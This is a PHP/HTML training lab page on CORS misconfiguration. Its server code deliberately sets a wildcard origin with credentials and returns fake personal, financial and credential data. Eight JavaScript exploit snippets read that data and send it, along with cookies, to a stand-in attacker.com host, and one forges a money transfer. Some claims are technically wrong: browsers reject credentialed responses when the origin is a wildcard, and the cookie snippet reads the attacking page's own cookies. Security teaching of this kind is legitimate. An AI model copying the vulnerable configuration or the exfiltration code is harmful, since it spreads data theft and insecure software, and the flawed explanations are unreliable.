<?php
// Lab 2: CORS with Wildcard Origin
// Vulnerability: CORS with wildcard origin allowing any domain

session_start();

$message = '';
$cors_headers = [];

// Simulate CORS with wildcard origin
function set_cors_headers() {
    // Vulnerable: Wildcard origin with credentials
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Sensitive-Data, X-API-Key, X-User-Info");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}

// Set CORS headers
set_cors_headers();

// Simulate API endpoint with sensitive data
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];
    
    switch ($action) {
        case 'profile':
            $profile_data = [
                'id' => 1,
                'username' => 'admin',
                'email' => 'admin@example.com',
                'full_name' => 'Administrator User',
                'phone' => '+1-555-0123',
                'address' => '123 Admin Street, City, State 12345',
                'ssn' => '123-45-6789',
                'credit_card' => '4111-1111-1111-1111',
                'role' => 'administrator',
                'permissions' => ['read', 'write', 'delete', 'admin', 'super_admin']
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: api_key_12345');
            header('X-User-Info: admin_user');
            echo json_encode($profile_data);
            exit();
            
        case 'financial':
            $financial_data = [
                'account_balance' => 50000.00,
                'credit_score' => 850,
                'bank_account' => '1234567890',
                'routing_number' => '021000021',
                'investment_portfolio' => [
                    'stocks' => 25000,
                    'bonds' => 15000,
                    'crypto' => 10000
                ],
                'transactions' => [
                    ['date' => '2024-01-01', 'amount' => 1000, 'type' => 'deposit'],
                    ['date' => '2024-01-02', 'amount' => -500, 'type' => 'withdrawal']
                ]
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: financial_api_key_67890');
            echo json_encode($financial_data);
            exit();
            
        case 'admin':
            $admin_data = [
                'admin_panel_url' => 'http://admin.example.com/dashboard',
                'database_credentials' => 'mysql://admin:password@localhost:3306/production',
                'api_keys' => [
                    'stripe' => 'sk_live_1234567890',
                    'aws' => 'AKIAIOSFODNN7EXAMPLE',
                    'google' => 'AIzaSyBOti4mM-6x9WDnZIjIey21xXQK8QJjJjJ'
                ],
                'server_info' => [
                    'hostname' => 'prod-server-01',
                    'ip_address' => '192.168.1.100',
                    'os' => 'Ubuntu 20.04 LTS',
                    'php_version' => '8.1.0'
                ],
                'backup_location' => '/var/backups/database/',
                'log_files' => '/var/log/apache2/access.log'
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: admin_api_key_99999');
            echo json_encode($admin_data);
            exit();
    }
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (isset($input['action'])) {
        switch ($input['action']) {
            case 'transfer_money':
                $message = '<div class="alert alert-success">Money transferred successfully!</div>';
                break;
            case 'update_financial':
                $message = '<div class="alert alert-success">Financial information updated!</div>';
                break;
            case 'admin_action':
                $message = '<div class="alert alert-success">Admin action executed!</div>';
                break;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: CORS with Wildcard Origin - CORS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .api-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .wildcard-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CORS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: CORS with Wildcard Origin</h1>
            <p class="hero-subtitle">CORS with wildcard origin allowing any domain</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CORS vulnerabilities where the server uses wildcard (*) origin with credentials enabled. This is a critical misconfiguration that allows any domain to make authenticated requests and access sensitive data.</p>
            <p><strong>Objective:</strong> Exploit wildcard CORS policies to steal sensitive data and perform unauthorized actions.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable CORS Headers
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Wildcard origin with credentials
function set_cors_headers() {
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Sensitive-Data, X-API-Key, X-User-Info");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-globe me-2"></i>Wildcard CORS Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="wildcard-warning">
                            <h5>⚠️ Wildcard CORS Warning</h5>
                            <p>This lab demonstrates wildcard CORS vulnerabilities:</p>
                            <ul>
                                <li><code>Access-Control-Allow-Origin: *</code> - Allows any origin</li>
                                <li><code>Access-Control-Allow-Credentials: true</code> - Allows credentials</li>
                                <li><code>Access-Control-Expose-Headers</code> - Exposes sensitive headers</li>
                                <li><code>Access-Control-Allow-Headers: *</code> - Allows all headers</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Sensitive API Endpoints</h5>
                            <p>Try these sensitive endpoints:</p>
                            <ul>
                                <li><code>?action=profile</code> - User profile with PII</li>
                                <li><code>?action=financial</code> - Financial data</li>
                                <li><code>?action=admin</code> - Admin panel data</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testWildcardCORS('profile')" class="btn btn-primary me-2">Test Profile Data</button>
                            <button onclick="testWildcardCORS('financial')" class="btn btn-primary me-2">Test Financial Data</button>
                            <button onclick="testWildcardCORS('admin')" class="btn btn-primary">Test Admin Data</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>API Response
                    </div>
                    <div class="card-body">
                        <div class="api-display">
                            <h5>API Response (May contain sensitive data):</h5>
                            <div id="api-response">Click a button above to test the API</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CORS with Wildcard Origin</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> GET/POST</li>
                        <li><strong>Issue:</strong> Wildcard origin with credentials</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Data Theft:</strong> Steal sensitive user data</li>
                        <li><strong>Financial Fraud:</strong> Access financial information</li>
                        <li><strong>Admin Takeover:</strong> Access admin panel data</li>
                        <li><strong>Header Exposure:</strong> Access exposed headers</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Wildcard CORS Exploitation Examples</h5>
            <p>Use these techniques to exploit wildcard CORS policies:</p>
            
            <h6>1. Basic Wildcard CORS Exploitation:</h6>
            <div class="code-block">// Exploit wildcard CORS from any domain
fetch('http://vulnerable-site.com/api?action=profile', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token'),
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => {
    // Access exposed headers
    const sensitiveData = response.headers.get('X-Sensitive-Data');
    const apiKey = response.headers.get('X-API-Key');
    const userInfo = response.headers.get('X-User-Info');
    
    console.log('Exposed headers:', {
        sensitiveData,
        apiKey,
        userInfo
    });
    
    return response.json();
})
.then(data => {
    console.log('Stolen profile data:', data);
    // Send to attacker server
    fetch('http://attacker.com/steal-profile', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>2. Financial Data Theft:</h6>
            <div class="code-block">// Steal financial data via wildcard CORS
fetch('http://vulnerable-site.com/api?action=financial', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token')
    }
})
.then(response => response.json())
.then(data => {
    console.log('Financial data stolen:', data);
    
    // Send financial data to attacker
    fetch('http://attacker.com/steal-financial', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            timestamp: new Date().toISOString(),
            financialData: data
        })
    });
});</div>

            <h6>3. Admin Panel Access:</h6>
            <div class="code-block">// Access admin panel data
fetch('http://vulnerable-site.com/api?action=admin', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('admin_token')
    }
})
.then(response => response.json())
.then(data => {
    console.log('Admin data stolen:', data);
    
    // Use stolen admin data
    if (data.admin_panel_url) {
        window.open(data.admin_panel_url, '_blank');
    }
    
    // Send admin data to attacker
    fetch('http://attacker.com/steal-admin', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>4. POST Request Exploitation:</h6>
            <div class="code-block">// Exploit POST requests with wildcard CORS
fetch('http://vulnerable-site.com/api', {
    method: 'POST',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token'),
        'X-Custom-Header': 'malicious-value'
    },
    body: JSON.stringify({
        action: 'transfer_money',
        amount: 10000,
        to_account: 'attacker-account-12345'
    })
})
.then(response => response.json())
.then(data => {
    console.log('Money transfer result:', data);
});</div>

            <h6>5. Header Manipulation:</h6>
            <div class="code-block">// Manipulate exposed headers
fetch('http://vulnerable-site.com/api?action=profile', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token'),
        'X-Custom-Header': 'malicious-value',
        'X-Requested-With': 'XMLHttpRequest'
    }
})
.then(response => {
    // Access all exposed headers
    const headers = {};
    response.headers.forEach((value, key) => {
        headers[key] = value;
    });
    
    console.log('All response headers:', headers);
    
    return response.json();
})
.then(data => {
    console.log('Data with headers:', { data, headers });
});</div>

            <h6>6. Cross-Domain Cookie Theft:</h6>
            <div class="code-block">// Steal cookies via wildcard CORS
fetch('http://vulnerable-site.com/api?action=profile', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => response.json())
.then(data => {
    // Get cookies from document.cookie
    const cookies = document.cookie;
    console.log('Stolen cookies:', cookies);
    
    // Send cookies and data to attacker
    fetch('http://attacker.com/steal-cookies', {
        method: 'POST',
        body: JSON.stringify({
            data: data,
            cookies: cookies,
            timestamp: new Date().toISOString()
        })
    });
});</div>

            <h6>7. Real-time Data Monitoring:</h6>
            <div class="code-block">// Continuous monitoring of sensitive data
setInterval(() => {
    fetch('http://vulnerable-site.com/api?action=financial', {
        method: 'GET',
        credentials: 'include',
        mode: 'cors'
    })
    .then(response => response.json())
    .then(data => {
        console.log('Real-time financial data:', data);
        
        // Send to attacker server
        fetch('http://attacker.com/monitor-financial', {
            method: 'POST',
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                data: data
            })
        });
    });
}, 30000); // Every 30 seconds</div>

            <h6>8. Advanced Header Exploitation:</h6>
            <div class="code-block">// Exploit all exposed headers
async function exploitAllHeaders() {
    const endpoints = ['profile', 'financial', 'admin'];
    
    for (const endpoint of endpoints) {
        try {
            const response = await fetch(`http://vulnerable-site.com/api?action=${endpoint}`, {
                method: 'GET',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + localStorage.getItem('token'),
                    'X-Custom-Header': 'malicious-value'
                }
            });
            
            // Extract all headers
            const headers = {};
            response.headers.forEach((value, key) => {
                headers[key] = value;
            });
            
            const data = await response.json();
            
            console.log(`${endpoint} data and headers:`, { data, headers });
            
            // Send to attacker
            fetch('http://attacker.com/steal-all', {
                method: 'POST',
                body: JSON.stringify({
                    endpoint: endpoint,
                    data: data,
                    headers: headers,
                    timestamp: new Date().toISOString()
                })
            });
            
        } catch (error) {
            console.error(`Failed to exploit ${endpoint}:`, error);
        }
    }
}

exploitAllHeaders();</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Data theft and sensitive information disclosure</li>
                <li>Financial fraud and money laundering</li>
                <li>Admin panel access and privilege escalation</li>
                <li>Cookie theft and session hijacking</li>
                <li>API abuse and unauthorized access</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Never use wildcard (*) origin with credentials</li>
                    <li>Use specific origins instead of wildcard</li>
                    <li>Implement proper origin validation</li>
                    <li>Use whitelist-based CORS policies</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual cross-origin requests</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use Content Security Policy (CSP)</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Audit exposed headers and minimize exposure</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testWildcardCORS(action) {
            fetch(`?action=${action}`, {
                method: 'GET',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Custom-Header': 'malicious-value'
                }
            })
            .then(response => {
                // Access exposed headers
                const sensitiveData = response.headers.get('X-Sensitive-Data');
                const apiKey = response.headers.get('X-API-Key');
                const userInfo = response.headers.get('X-User-Info');
                
                let headerInfo = '';
                if (sensitiveData) headerInfo += `<div class="alert alert-warning">X-Sensitive-Data: ${sensitiveData}</div>`;
                if (apiKey) headerInfo += `<div class="alert alert-warning">X-API-Key: ${apiKey}</div>`;
                if (userInfo) headerInfo += `<div class="alert alert-warning">X-User-Info: ${userInfo}</div>`;
                
                return response.json().then(data => ({
                    data: data,
                    headers: headerInfo
                }));
            })
            .then(result => {
                document.getElementById('api-response').innerHTML = 
                    result.headers + 
                    '<pre>' + JSON.stringify(result.data, null, 2) + '</pre>';
            })
            .catch(error => {
                document.getElementById('api-response').innerHTML = '<div class="alert alert-danger">Error: ' + error.message + '</div>';
            });
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
